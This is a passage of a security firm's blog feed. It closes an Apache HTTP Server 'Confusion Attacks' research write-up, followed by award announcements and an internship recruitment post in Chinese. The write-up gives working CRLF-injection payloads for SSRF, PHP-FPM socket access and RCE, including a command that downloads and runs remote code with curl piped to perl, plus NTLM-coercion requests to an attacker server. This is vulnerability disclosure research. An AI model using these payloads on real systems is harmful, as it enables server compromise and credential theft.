&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;m{^https?://}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Location: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$redir&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type: text/html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;️-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;✔️ 3-2-1. Arbitrary Handler to Information Disclosure&lt;/h5&gt;

&lt;p&gt;Starting with invoking an arbitrary handler to disclose information, we use the built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server-status&lt;/code&gt; handler in Apache HTTP Server, which is typically only allowed to be accessed locally:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /server-status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; server-status
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; local
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the ability to invoke any handler, it becomes possible to overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; to access sensitive information that should not be accessible remotely:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:server-status&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;✔️ 3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/h5&gt;

&lt;p&gt;It’s also easy to transform an image with a legitimate extension into a PHP backdoor. For instance, this primitive allows specifying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; to execute embedded malicious code within the image, like:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/uploads/avatar.webp&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:application/x-httpd-php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;️-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;✔️ 3-2-2. Arbitrary Handler to Full SSRF&lt;/h5&gt;

&lt;p&gt;Calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; to access any protocol on any URL is, of course, straightforward:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:http://example.com/%3f&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Moreover, this is also a full-control SSRF where you can control all request headers and obtain all HTTP responses! A slight disappointment is when accessing Cloud Metadata, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; automatically adds an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Forwarded-For&lt;/code&gt; header, which gets blocked by EC2 and GCP’s &lt;a href=&quot;https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations&quot;&gt;Metadata protection mechanisms&lt;/a&gt;, otherwise, this would be an even more powerful primitive.&lt;/p&gt;

&lt;h5 id=&quot;️-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;✔️ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/h5&gt;

&lt;p&gt;However, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; offers a more “convenient” feature — it can access local Unix Domain Sockets! 😉&lt;/p&gt;

&lt;p&gt;Here’s a demonstration accessing PHP-FPM’s local Unix Domain Socket to execute a PHP backdoor located in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Theoretically, this technique has even more potential, such as protocol smuggling (smuggling FastCGI in HTTP/HTTPS protocols 😏) or exploiting other vulnerable local sockets. These possibilities are left for interested readers to explore.&lt;/p&gt;

&lt;h5 id=&quot;️-3-2-4-arbitrary-handler-to-rce&quot;&gt;✔️ 3-2-4. Arbitrary Handler to RCE&lt;/h5&gt;

&lt;p&gt;Finally, let’s demonstrate how to transform this primitive into an RCE using a common CTF trick! Since the official &lt;a href=&quot;https://hub.docker.com/_/php&quot;&gt;PHP Docker&lt;/a&gt; image includes PEAR, a command-line PHP package management tool, using its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pearcmd.php&lt;/code&gt; as an entry point allows us to achieve further exploitation. You can check this article — &lt;a href=&quot;https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&quot;&gt;Docker PHP LFI Summary&lt;/a&gt;, written by &lt;a href=&quot;https://x.com/phithon_xg&quot;&gt;Phith0n&lt;/a&gt; for details!&lt;/p&gt;

&lt;p&gt;Here we utilize a Command Injection within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run-tests&lt;/code&gt; to complete the entire exploit chain, detailed as follows:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It’s common to see CRLF Injection or Header Injection being reported as XSS in Security Advisories or Bug Bounties. While it is true that these can sometimes chain to impactful vulnerabilities like Account Takeover through SSO, please don’t forget that they can also lead to Server-Side RCE, as this demonstration proves its potential!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-4-other-vulnerabilities&quot;&gt;🔥 4. Other Vulnerabilities&lt;/h3&gt;

&lt;p&gt;While this essentially covers the Confusion Attacks, some minor vulnerabilities discovered during our research of Apache HTTP Server are worth mentioning separately.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-cve-2024-38472---windows-unc-based-ssrf&quot;&gt;⚔️ CVE-2024-38472 - Windows UNC-based SSRF&lt;/h4&gt;

&lt;p&gt;Firstly, the Windows implementation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apr_filepath_merge()&lt;/code&gt; function allows the use of UNC paths, which allows attackers to coerce NTLM authentication to any host. Here we list two different triggering paths:&lt;/p&gt;

&lt;h5 id=&quot;️-triggered-via-http-request-parser&quot;&gt;✔️ Triggered via HTTP Request Parser&lt;/h5&gt;

&lt;p&gt;Direct triggering through an HTTP request parser in Httpd requires additional configuration, which might seem impractical at first glance but often appears with Tomcat (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_jk&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_ajp&lt;/code&gt;) or pairing with &lt;a href=&quot;https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes&quot;&gt;PATH_INFO&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Additionally, since Httpd rewrote its core HTTP request parser logic after 2.4.49, triggering the vulnerability in versions above requires an additional configuration:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
MergeSlashes &lt;span class=&quot;ss&quot;&gt;Off&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By using two &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%5C&lt;/code&gt; can force Httpd to coerce NTLM authentication to an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attacker-server&lt;/code&gt;, and practically, this SSRF can be converted into RCE through &lt;a href=&quot;https://en.hackndo.com/ntlm-relay/&quot;&gt;NTLM Relay&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/%5C%5Cattacker-server/path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-triggered-via-type-map&quot;&gt;✔️ Triggered via Type-Map&lt;/h5&gt;

&lt;p&gt;In the &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235&quot;&gt;Debian/Ubuntu&lt;/a&gt; distribution of Httpd, Type-Map is enabled by default:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; type-map &lt;span class=&quot;ss&quot;&gt;var&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By uploading a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; file to the server and setting the URI field to a UNC path, you can also force the server to coerce NTLM authentication to the attacker. This is also &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle&quot;&gt;the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; trick&lt;/a&gt; I proposed. 😉&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-cve-2024-39573---ssrf-via-full-control-of-rewriterule-prefix&quot;&gt;⚔️ CVE-2024-39573 - SSRF via Full Control of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; Prefix&lt;/h4&gt;

&lt;p&gt;Lastly, when you have full control over the prefix of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; substitution target in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost&lt;/code&gt; is fully controllable, you can invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; and its sub-modules:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/broken(.*) $1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the following URL can delegate the request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; for processing:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/brokenproxy:unix:/run/[...]|http://path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But if administrators have tested the rule properly, they would realize that such rules are impractical. Thus, originally it was reported along with another vulnerability as an exploit chain, but this behavior was also treated as a security boundary fix by the security team. As the patches came out, other researchers applied the same behavior to Windows UNC and obtained another additional CVE.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;future-works&quot;&gt;Future Works&lt;/h2&gt;

&lt;p&gt;Finally, let’s talk about future works and areas for improvement in this research. Confusion Attacks are still a very promising attack surface, especially since my research focused mainly on just two fields. Unless the Apache HTTP Server undergoes architectural improvements or provides better development standards, I believe we’ll see more “confusions” in the future!&lt;/p&gt;

&lt;p&gt;So, what other areas could be enhanced? In reality, different Httpd distributions have different configurations, so other Unix-Like systems such as the RHEL series, BSD family, and even applications that utilize Httpd might have more escapable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;, more powerful local gadgets, and unexpected symbolic jumps. These are all left for those interested to continue exploring.&lt;/p&gt;

&lt;p&gt;Due to time constraints, I was unable to share more real-world cases found and exploited in actual websites, devices, or even open-source projects. However, you can probably imagine — the real world is still full of countless unexplored rules, bypassable authentications, and hidden CGIs waiting to be uncovered. How to hunt these techniques worldwide? That’s your mission!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Maintaining an open-source project is truly challenging, especially when trying to balance user convenience with the compatibility of older versions. A slight oversight can lead to the entire system being compromised, such as what happened with Httpd 2.4.49, where a minor change in path processing logic led to the disastrous &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773&quot;&gt;CVE-2021-41773&lt;/a&gt;. The entire development process must be carefully built upon a pile of legacy code and technical debt. So, if any Apache HTTP Server developers are reading this: Thank you for your hard work and contributions!&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/</link>
                <guid>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en</guid>
                <pubDate>Fri, 09 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Angelboy 入列微軟 MSRC 2024 前百大最有價值資安研究員！</title>
                <description>&lt;p&gt;恭喜 DEVCORE 資深資安研究員 Angelboy 榮獲 Microsoft 的 MSRC 2024 Most Valuable Security Researchers 的殊榮！除了在不分項 TOP 100 名單中榮獲 #33 名，在 Angelboy 長年研究的 Windows 領域中，他更以 #9 的名次擠入前十大行列。&lt;/p&gt;

&lt;p&gt;這不僅是 Angelboy 首次登上該年度榜單，同時也是該名單中排名最高的台灣資安研究員。&lt;/p&gt;

&lt;p&gt;Microsoft 旗下的 Microsoft Security Response Center（MSRC，或稱 Microsoft 安全性回應中心）長期藉 Microsoft Researcher Recognition Program（MRRR）計畫，公開表揚協助 Microsoft 挖掘系統安全漏洞的資安研究員，以此致謝優秀資安研究員為 Microsoft 的客戶及產品安全所付出的努力。&lt;/p&gt;

&lt;p&gt;Microsoft 於 7 日公布的 MSRC 2024 Most Valuable Security Researchers 名單，是根據 2023 年 7 月至 2024 年 6 月，全球各地資安研究員向 MSRC 回報的漏洞得分所統計而得。在整體不分項名單中，Angelboy 獲得了 #33 名的殊榮。而針對 Microsoft 旗下各類型產品的 Windows 類別中，Angelboy 則入列 TOP 10，獲得 #9 的成績，並經認證全數漏洞回報皆為有效回報。&lt;/p&gt;

&lt;p&gt;再次恭喜 Angelboy 奪得此一殊榮！&lt;/p&gt;

&lt;p&gt;參考資料：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2024/08/congratulations-to-the-msrc-2024-most-valuable-security-researchers/&quot;&gt;Microsoft official announcement - Congratulations to the MSRC 2024 Most Valuable Security Researchers!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/leaderboard&quot;&gt;Microsoft MSRC 2024 leaderboard&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy/</link>
                <guid>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy</guid>
                <pubDate>Thu, 08 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>MSRC 2024 Most Valuable Security Researchers - Angelboy</title>
                <description>&lt;p&gt;We’re thrilled to announce that Angelboy, senior security researcher at DEVCORE, is named one of Microsoft’s MSRC 2024 Most Valuable Security Researchers! He not only secured the #33 spot on the overall list but also achieved the #9 position in the Windows category.&lt;/p&gt;

&lt;p&gt;This is the first time Angelboy has been shortlisted on this annual leaderboard, and he is also the highest-ranked Taiwanese security researcher featured. This prestigious accomplishment highlights his exceptional expertise and significant contributions to the field.&lt;/p&gt;

&lt;p&gt;The Microsoft Security Response Center (MSRC) has long recognized the efforts of security researchers who partner with Microsoft in reporting vulnerabilities through its Microsoft Researcher Recognition Program (MRRR). The program expresses gratitude for their contributions to the security of Microsoft’s global customers and products.&lt;/p&gt;

&lt;p&gt;The MSRC 2024 Most Valuable Security Researchers list, announced on August 7th, is based on the total number of points the researchers earned for each valid report from July 2023 to June 2024. Angelboy secured the #33 spots on the leaderboard. Specifically, his dedicated passion for Windows Kernel research earned him a #9 ranking in the Windows category, placing him in the TOP 10. He was also awarded “Accuracy” and “Volume” badges, further highlighting his significant contributions to vulnerability research.&lt;/p&gt;

&lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2024/08/congratulations-to-the-msrc-2024-most-valuable-security-researchers/&quot;&gt;Microsoft official announcement - Congratulations to the MSRC 2024 Most Valuable Security Researchers!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/leaderboard&quot;&gt;Microsoft MSRC 2024 leaderboard&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy-en/</link>
                <guid>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy-en</guid>
                <pubDate>Thu, 08 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2024 第六屆實習生計畫</title>
                <description>&lt;p&gt;DEVCORE 創立迄今已逾十年，持續專注於提供主動式資安服務，並致力尋找各種安全風險及漏洞，讓世界變得更安全。為了持續尋找更多擁有相同理念的資安新銳、協助學生建構正確資安意識及技能，我們成立了「戴夫寇爾全國資訊安全獎學金」，2022 年初開始舉辦首屆實習生計畫，目前為止成果頗豐、超乎預期，第五屆實習生計畫也將於今年 7 月底告一段落。我們很榮幸地宣佈，第六屆實習生計畫即將登場，若您期待加入我們、精進資安技能，煩請詳閱下列資訊後來信報名！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;實習內容&quot;&gt;實習內容&lt;/h3&gt;

&lt;p&gt;本次實習分為 Research 及 Red Team 兩個組別，主要內容如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Research (Binary/Web)
以研究為主，在與導師確定研究標的後，分析目標架構、進行逆向工程或程式碼審查。藉由這個過程訓練自己的思路，找出可能的攻擊面與潛在的弱點。另外也會讓大家嘗試分析及撰寫過往漏洞的 Exploit，理解過去漏洞都出現在哪，體驗真實世界的漏洞都是如何利用。
    &lt;ul&gt;
      &lt;li&gt;漏洞挖掘及研究 60 %&lt;/li&gt;
      &lt;li&gt;1-day 開發 (Exploitation) 30 %&lt;/li&gt;
      &lt;li&gt;成果報告與準備 10 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Red Team
研究並深入學習紅隊常用技巧，熟悉實戰中會遇到的情境、語言與架構。了解常見漏洞的成因、實際利用方法、嚴苛條件下的利用策略、黑箱測試方式及各種奇技淫巧。學習後滲透時的常見限制、工具概念與原理。
    &lt;ul&gt;
      &lt;li&gt;漏洞與技巧的研究及深入學習 70 %&lt;/li&gt;
      &lt;li&gt;Lab 建置或 Bug Bounty 或漏洞挖掘 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;公司地點&quot;&gt;公司地點&lt;/h3&gt;

&lt;p&gt;台北市松山區八德路三段 32 號 13 樓&lt;/p&gt;

&lt;h3 id=&quot;實習時間&quot;&gt;實習時間&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2024 年 9 月開始到 2025 年 1 月底，共 5 個月。&lt;/li&gt;
  &lt;li&gt;每週工作兩天，工作時間為 10:00 – 18:00
    &lt;ul&gt;
      &lt;li&gt;每週固定一天下午 14:00 - 18:00 必須到公司討論進度
        &lt;ul&gt;
          &lt;li&gt;如果居住雙北外可彈性調整（但須每個組別統一）&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;其餘時間皆為遠端作業&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;招募對象&quot;&gt;招募對象&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;具有一定程度資安背景的學生，且可每週工作兩天&lt;/li&gt;
  &lt;li&gt;此外並無其他招募限制，歷屆實習生可重複應徵&lt;/li&gt;
  &lt;li&gt;對資格有任何疑慮，歡迎來信詢問&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;預計招收名額&quot;&gt;預計招收名額&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Research 組：2~3 人&lt;/li&gt;
  &lt;li&gt;Red Team 組：2~3 人&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;薪資待遇&quot;&gt;薪資待遇&lt;/h3&gt;

&lt;p&gt;每月新台幣 16,000 元&lt;/p&gt;

&lt;h2 id=&quot;招募條件資格與流程&quot;&gt;招募條件資格與流程&lt;/h2&gt;

&lt;h3 id=&quot;實習條件要求&quot;&gt;實習條件要求&lt;/h3&gt;

&lt;h4 id=&quot;research-binaryweb&quot;&gt;Research (Binary/Web)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;基本漏洞利用及挖掘能力&lt;/li&gt;
  &lt;li&gt;具備研究熱誠，習慣了解技術本質&lt;/li&gt;
  &lt;li&gt;熟悉任一種 Scripting Language（如：Shell Script、Python、Ruby），並能使用腳本輔以研究&lt;/li&gt;
  &lt;li&gt;具備除錯能力，能善用 Debugger 追蹤程式流程、能重現並收斂問題&lt;/li&gt;
  &lt;li&gt;具備獨立分析開放原始碼專案的能力，能透過分析程式碼理解目標專案的架構&lt;/li&gt;
  &lt;li&gt;熟悉並理解常見的漏洞成因
    &lt;ul&gt;
      &lt;li&gt;OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;Memory Corruption&lt;/li&gt;
      &lt;li&gt;Race Condition&lt;/li&gt;
      &lt;li&gt;…&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;CTF 比賽經驗&lt;/li&gt;
      &lt;li&gt;pwnable.tw 成績&lt;/li&gt;
      &lt;li&gt;有公開的技術 blog/slide、write-ups 或是演講&lt;/li&gt;
      &lt;li&gt;精通 IDA Pro 或 Ghidra&lt;/li&gt;
      &lt;li&gt;熟悉任一種網頁程式語言或框架（如：PHP、ASP.NET、Express.js），具備可以建立完整網頁服務的能力&lt;/li&gt;
      &lt;li&gt;理解 &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; 中的安全議題&lt;/li&gt;
      &lt;li&gt;獨立挖掘過 0-day 漏洞，或分析過 1-day 的經驗&lt;/li&gt;
      &lt;li&gt;具備下列其中之一經驗
        &lt;ul&gt;
          &lt;li&gt;Web Application Exploit&lt;/li&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;熟悉 OWASP Web Top 10&lt;/li&gt;
  &lt;li&gt;理解 &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; 中所有的安全議題或已完成所有 Lab&lt;/li&gt;
  &lt;li&gt;理解計算機網路的基本概念&lt;/li&gt;
  &lt;li&gt;熟悉任一種網頁程式開發方式（如：PHP、ASP.NET、JSP），具備可以建立完整網頁服務的能力&lt;/li&gt;
